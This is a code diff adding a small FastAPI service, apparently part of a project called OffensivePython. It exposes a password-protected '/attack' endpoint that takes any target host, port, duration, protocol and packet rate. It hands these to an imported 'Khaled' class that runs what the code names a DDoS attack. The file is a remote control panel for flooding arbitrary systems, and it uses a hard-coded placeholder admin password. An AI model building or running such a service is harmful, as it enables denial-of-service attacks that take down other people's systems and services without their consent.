@@ -1,0 +1,24 @@
+from fastapi import FastAPI, HTTPException, Depends
+from fastapi.security import HTTPBasic, HTTPBasicCredentials
+import secrets
+import asyncio
+from offensivepython.tools.khaled import Khaled
+
+app = FastAPI(title="OffensivePython API")
+security = HTTPBasic()
+
+USER = "admin"
+PASSWORD = "yourStrongPasswordHere"
+
+def authenticate(credentials: HTTPBasicCredentials = Depends(security)):
+    correct_username = secrets.compare_digest(credentials.username, USER)
+    correct_password = secrets.compare_digest(credentials.password, PASSWORD)
+    if not (correct_username and correct_password):
+        raise HTTPException(status_code=401, detail="Unauthorized")
+    return credentials.username
+
+@app.post("/attack")
+async def attack_ddos(target: str, port: int = 80, duration: int = 10, method: str = "UDP", pps: int = 100, username: str = Depends(authenticate)):
+    attack = Khaled(target, port, duration, method, pps)
+    await attack.attack()
+    return {"status": "attack finished", "target": target}
